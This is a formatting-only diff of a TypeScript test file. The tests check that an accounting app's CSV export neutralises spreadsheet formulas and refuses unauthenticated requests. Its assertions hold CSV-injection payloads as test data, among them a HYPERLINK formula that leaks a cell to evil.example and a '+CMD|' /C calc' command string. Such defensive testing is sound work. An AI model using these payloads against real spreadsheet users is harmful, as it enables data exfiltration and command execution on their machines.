@@ -14,8 +14,7 @@ const exportState: ExportState = {
   authz: { user: { orgId: "org-1", id: "user-1" } },
   dbCalls: 0,
 };
-(globalThis as typeof globalThis & Record<symbol, unknown>)[stateKey] =
-  exportState;
+(globalThis as typeof globalThis & Record<symbol, unknown>)[stateKey] = exportState;
 (
   globalThis as typeof globalThis & Record<string, unknown>
 ).openbooksInformationReturnExportNextResponse = NextResponse;
@@ -146,9 +145,7 @@ test("GET neutralizes formula-leading filing and recipient text in CSV exports",
   exportState.dbCalls = 0;
 
   const response = await GET(
-    new Request(
-      `http://openbooks.test/api/compliance/information-returns/${FILING_ID}/export`,
-    ),
+    new Request(`http://openbooks.test/api/compliance/information-returns/${FILING_ID}/export`),
     {
       params: Promise.resolve({ id: FILING_ID }),
     },
@@ -165,10 +162,7 @@ test("GET neutralizes formula-leading filing and recipient text in CSV exports",
 
   // Apostrophe neutralization keeps these values visibly intact while making
   // spreadsheet applications treat them as literal text, even when quoted.
-  assert.equal(
-    data[index("payer_name")],
-    '\'=HYPERLINK("https://evil.example/?x="&A1,"click")',
-  );
+  assert.equal(data[index("payer_name")], '\'=HYPERLINK("https://evil.example/?x="&A1,"click")');
   assert.equal(data[index("recipient_legal_name")], "'+CMD|' /C calc'!A0");
   assert.equal(data[index("recipient_display_name")], "'-2+2");
   assert.equal(data[index("tin_type")], "'@SUM(1,1)");
@@ -184,9 +178,7 @@ test("GET refuses unauthenticated export requests", async () => {
   exportState.authz = null;
   exportState.dbCalls = 0;
   const response = await GET(
-    new Request(
-      `http://openbooks.test/api/compliance/information-returns/${FILING_ID}/export`,
-    ),
+    new Request(`http://openbooks.test/api/compliance/information-returns/${FILING_ID}/export`),
     {
       params: Promise.resolve({ id: FILING_ID }),
     },
